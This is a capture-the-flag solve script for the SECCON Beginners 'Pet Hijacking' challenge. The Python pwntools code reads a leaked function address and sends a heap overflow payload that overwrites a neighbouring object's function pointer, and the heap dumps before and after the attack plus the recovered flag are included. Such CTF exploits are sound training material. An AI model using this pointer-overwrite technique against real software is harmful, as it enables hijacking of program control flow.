"""
--- Pet Hijacking ---
Your mission: Make Pet speak the secret FLAG!

[hint] The secret action 'speak_flag' is at: 0x5ca6139f6492
[*] Pet A is allocated at: 0x5ca6263e72a0
[*] Pet B is allocated at: 0x5ca6263e72d0

[Initial Heap State]

--- Heap Layout Visualization ---
0x00005ca6263e72a0: 0x00005ca6139f65d2 <-- pet_A->speak
0x00005ca6263e72a8: 0x00002e2e2e6e6177 <-- pet_A->sound
0x00005ca6263e72b0: 0x0000000000000000
0x00005ca6263e72b8: 0x0000000000000000
0x00005ca6263e72c0: 0x0000000000000000
0x00005ca6263e72c8: 0x0000000000000031
0x00005ca6263e72d0: 0x00005ca6139f65d2 <-- pet_B->speak (TARGET!)
0x00005ca6263e72d8: 0x00002e2e2e6e6177 <-- pet_B->sound
0x00005ca6263e72e0: 0x0000000000000000
0x00005ca6263e72e8: 0x0000000000000000
0x00005ca6263e72f0: 0x0000000000000000
0x00005ca6263e72f8: 0x0000000000020d11
---------------------------------

Input a new cry for Pet A >
"""

from pwn import *
import re

io = remote('pet-sound.challenges.beginners.seccon.jp','9090')
speak_flag_addr = io.recvline_contains("[hint] The secret action 'speak_flag' is at: ").decode()
speak_flag_addr = re.search(r'0x([0-9a-f]*)', speak_flag_addr).group(1)
print(speak_flag_addr)
speak_flag_addr_char = bytearray.fromhex(speak_flag_addr.zfill(16))
speak_flag_addr_char.reverse()

io.sendline(b'wan...\x00\x00' + (b'\x00'*8)*4 + bytes(speak_flag_addr_char))

print(io.recvall().decode())

"""
Input a new cry for Pet A > 
[Heap State After Input]

--- Heap Layout Visualization ---
0x000064aa683f52a0: 0x000064aa4b2b75d2 <-- pet_A->speak
0x000064aa683f52a8: 0x00002e2e2e6e6177 <-- pet_A->sound
0x000064aa683f52b0: 0x0000000000000000
0x000064aa683f52b8: 0x0000000000000000
0x000064aa683f52c0: 0x0000000000000000
0x000064aa683f52c8: 0x0000000000000000
0x000064aa683f52d0: 0x000064aa4b2b7492 <-- pet_B->speak (TARGET!)
0x000064aa683f52d8: 0x00002e2e2e6e610a <-- pet_B->sound
0x000064aa683f52e0: 0x0000000000000000
0x000064aa683f52e8: 0x0000000000000000
0x000064aa683f52f0: 0x0000000000000000
0x000064aa683f52f8: 0x0000000000020d11
---------------------------------
Pet says: wan...

**********************************************
* Pet suddenly starts speaking flag.txt...!? *
* Pet: "ctf4b{y0u_expl0it_0v3rfl0w!}" *
**********************************************
"""
